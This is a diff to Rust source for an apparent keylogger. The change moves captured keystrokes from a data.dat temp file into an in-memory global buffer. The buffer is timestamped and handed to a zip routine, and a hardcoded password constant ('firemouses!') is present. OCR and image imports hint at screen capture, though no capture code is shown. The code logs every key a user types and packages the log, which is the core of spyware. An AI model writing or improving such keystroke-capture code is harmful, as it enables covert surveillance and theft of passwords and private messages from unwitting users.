@@ -18,10 +18,12 @@ use image::io::Reader as ImageReader;
 use image::{DynamicImage, ImageBuffer};
 use rusty_tesseract::{Args, Image};
 use regex::RegexBuilder;
+use std::sync::Mutex;
+use once_cell::sync::Lazy;
 use monitor::*;
 
-const TEMP: &str = "data.dat";
 const PASS: &[u8] = b"firemouses!";
+static LOG_FILE: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
 
 fn main() {
     #[derive(Copy, Clone, Eq, PartialEq, Debug)]
@@ -217,47 +219,20 @@ fn track_activity(event: Event) {
             let x: String = format!("{}", now);
             let now_parsed: DateTime<Utc> = x.parse().unwrap();
 
-            let mut fileRead = OpenOptions::new()
-                .read(true)
-                .open(TEMP)
-                .expect("Unable to open data file");
+            *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
+            let logs = LOG_FILE.lock().unwrap().clone();
 
-            let mut data = String::new();
-            fileRead.read_to_string(&mut data);
-
-            let logs = now_parsed.to_string() + "     " + &data + "\n";
-
-            zip_main(logs);
-
-            let mut fileClear = OpenOptions::new()
-                .write(true)
-                .truncate(true)
-                .open(TEMP)
-                .expect("Unable to open data file to clear.");
+            dologs(logs);
         },
         EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
         EventType::KeyPress(Key) => {
             let key = event.name.unwrap();
-            let mut fileRef = OpenOptions::new()
-                .append(true)
-                .create(true)
-                .open(TEMP)
-                .expect("Unable to open data file to log.");
-    
-            fileRef.write(key.as_bytes()).expect("write failed");
+            let old = LOG_FILE.lock().unwrap().clone();
+            *LOG_FILE.lock().unwrap() = old + &key;
         },
         EventType::MouseMove{x, y} => (),
         _ => (),
     }
-}
-
-fn zip_main(logs: String) -> i32 {
-    match dologs(logs) {
-        Ok(_) => println!("Zipped successfuly."),
-        Err(e) => println!("Failed to zip.: {e:?}"),
-    }
-
-    0
 }
 
 fn dologs(logs: String) -> ZipResult<()> {
